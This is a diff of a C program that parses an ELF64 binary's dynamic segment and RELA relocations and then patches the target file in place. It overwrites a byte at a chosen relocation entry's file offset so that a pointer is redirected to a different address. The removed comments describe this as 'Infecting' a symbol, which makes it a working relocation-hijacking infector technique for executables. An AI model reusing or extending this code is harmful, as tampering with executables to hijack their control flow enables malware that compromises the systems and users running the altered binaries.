@@ -66,7 +66,7 @@ struct dynamic_t get_dynamic_segment(Elf64_Phdr dyn_phdr, int host_fd){
   /* getting dyn_entries */
   dyn_entries = (Elf64_Dyn *)malloc(dyn_filesz);
   if (dyn_entries == NULL) {
-    perror("malloc");
+    perror("dyn malloc");
     close(host_fd);
     free(dyn_entries);
   }
@@ -76,7 +76,7 @@ struct dynamic_t get_dynamic_segment(Elf64_Phdr dyn_phdr, int host_fd){
   for(Elf64_Off edyn_start = dyn_start; edyn_start < dyn_end; edyn_start = edyn_start + sizeof(Elf64_Dyn)){
     Elf64_Dyn   dyn_entry;
     if(lseek(host_fd, edyn_start, SEEK_SET) == -1) {
-      perror("lseek");
+      perror("dyn lseek");
       close(host_fd);
     }
     read(host_fd, &dyn_entry, sizeof(Elf64_Dyn));
@@ -118,34 +118,24 @@ struct rela_t get_relocation_table(struct dynamic_t dyn_segment, int host_fd) {
 
   rela_end = rela_start + (rela_count * sizeof(Elf64_Rela));
   rela_entries = (Elf64_Rela *)malloc(sizeof(Elf64_Rela));
+  if (rela_entries == NULL) {
+    perror("rela malloc");
+    close(host_fd);
+    free(rela_entries);
+  }
 
   /* TODO: fazer o for usando rela_count */
   int y = 0;
   for(Elf64_Off size = sizeof(Elf64_Rela); rela_start < rela_end; rela_start += size){
     Elf64_Rela rela_entry;
     if(lseek(host_fd, rela_start, SEEK_SET) == -1) {
-      perror("[-] Error seeking to offset");
+      perror("rela lseek");
       close(host_fd);
     }
     // printf("[+] Rela entry found in 0x%x\n", rela_start);
     read(host_fd, &rela_entry, sizeof(Elf64_Rela));
-    
-    // // 0000000000001139 <msg>:
-    // if(rela_entry.r_addend == 0x1139){
-    //   printf("[+] Infecting 0x1139 <msg> symbol\n");
-    //   rela_entry.r_addend = 0x117b;
-    //   write(host_fd, rela_entry, sizeof(Elf64_Rela));
-    // }
-    
     rela_entries[y] = rela_entry;
     y++;
-  }
-  printf("[+] DT_RELA Entires:\nINDEX\tADDEND\tOFFSET\tINFO\tTYPE\n");
-  for(int k = 0; k < y; k++){
-    if(rela_entries[k].r_info == R_X86_64_RELATIVE){
-      printf("%i\t0x%x\t0x%x\t0x%x\tR_X86_64_RELATIVE\n", k, rela_entries[k].r_addend, rela_entries[k].r_offset, rela_entries[k].r_info);
-      
-    }
   }
   table.count = y;
   table.entries = rela_entries;
@@ -168,13 +158,16 @@ int main(int argc, char *argv[]) {
   Elf64_Ehdr *ehdr;
   Elf64_Phdr *phdr;
   Elf64_Shdr *shdr;
+  Elf64_Rela *victim_rela;
   struct phdrs_t phdrs;
+  struct dynamic_t dyn_segment;
+  struct rela_t relocation_table;
 
   int host_fd, ofd;
   struct stat st;
   char *host_mem;
   const uint8_t addr[2] = {0x7b, 0x11};  
-
+  
   if ((host_fd = open(argv[1], O_RDWR)) < 0) return 1;
 
   fstat(host_fd, &st);
@@ -189,14 +182,21 @@ int main(int argc, char *argv[]) {
   
   for (int i = 0; i < phdrs.count; i++) {
     if (phdrs.phdr[i].p_type == PT_DYNAMIC){ 
-      struct dynamic_t dyn_segment = get_dynamic_segment(phdrs.phdr[i], host_fd);
-      struct rela_t relocation_table = get_relocation_table(dyn_segment, host_fd);
+      dyn_segment = get_dynamic_segment(phdrs.phdr[i], host_fd);
+      relocation_table = get_relocation_table(dyn_segment, host_fd);
       
       printf("[+] .dynamic has %i entries\n", dyn_segment.count);
       printf("[+] relocation table has %i entries\n", relocation_table.count);
 
+      printf("[+] DT_RELA Entires:\nINDEX\tADDEND\tOFFSET\tINFO\tTYPE\n");
+      for(int j = 0; j < relocation_table.count; j++){
+        if(relocation_table.entries[j].r_info == R_X86_64_RELATIVE){
+          printf("%i\t0x%x\t0x%x\t0x%x\tR_X86_64_RELATIVE\n", j, relocation_table.entries[j].r_addend, relocation_table.entries[j].r_offset, relocation_table.entries[j].r_info);
+        }
+      }
       /* Writing to the mmaped page and copying the mmaped page to the host */
-      printf("[+] File offset = %x\n", get_file_offset(phdrs, relocation_table.entries[1].r_offset));
+      printf("[+] File offset of the victim relocation entry 0x%x\n", get_file_offset(phdrs, relocation_table.entries[1].r_offset));
+      printf("[+] %x\n", host_mem[get_file_offset(phdrs, relocation_table.entries[1].r_offset)]);
       host_mem[get_file_offset(phdrs, relocation_table.entries[1].r_offset)] = 0x7b;
       //host_mem[relocation_table.entries[1].r_offset - 0x1000 + 1] = 0x11;
 
